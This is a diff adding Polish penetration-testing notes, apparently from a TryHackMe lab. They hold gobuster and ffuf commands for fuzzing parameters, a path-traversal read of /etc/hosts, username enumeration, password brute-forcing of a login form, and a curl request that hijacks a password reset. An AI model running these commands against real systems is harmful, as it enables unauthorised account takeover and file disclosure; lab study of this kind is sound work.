@@ -1,0 +1,27 @@
+1) Fazowanie zmiennej get. W miejscu “FUZZ” beda podstawiane kolejne slowa
+      • Instalacja slownikow
+            ▪ sudo apt-get install seclists
+      • Fazowanie podstawowe
+            ▪ gobuster fuzz -t 30 -k -u "<IP>?<var>=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt
+      • Fazowanie duzym slownikiem
+            ▪  gobuster fuzz -t 30 -k -u "<IP>?<var>=FUZZ" -w /usr/share/dirb/wordlists/big.txt
+      • Fazowanie z proxy
+            ▪ gobuster fuzz -t 30 -k -u "<IP>?<var>=FUZZ" -w <dictionary> --proxy "<address proxy>"
+
+2) Wyszukiwanie zmiennej get.
+      • Pruba wyswietlenia pliku z serverza
+            ▪ gobuster fuzz -k -u <ip>?FUZZ=../../../../../../etc/hosts -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+3) Fazowanie formularza
+      • Fuzz (spr  urzytkownikow istniejacych)
+            ▪ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.239.130/customers/signup -mr "username already exists"
+      • Fuzz dwie listy (po : podajemy nazwe zamiast FUZZ dla slow)
+            ▪ ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.239.130/customers/login -fc 200
+
+4) Przyklady
+      • Jezeli adres e-mail do resetowania jest wywylany w get to mozemy sprubowac go wyprzedzic
+            ▪ curl 'http://10.10.239.130/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=dupa@customer.acmeitsupport.thm'
+
+
+
+
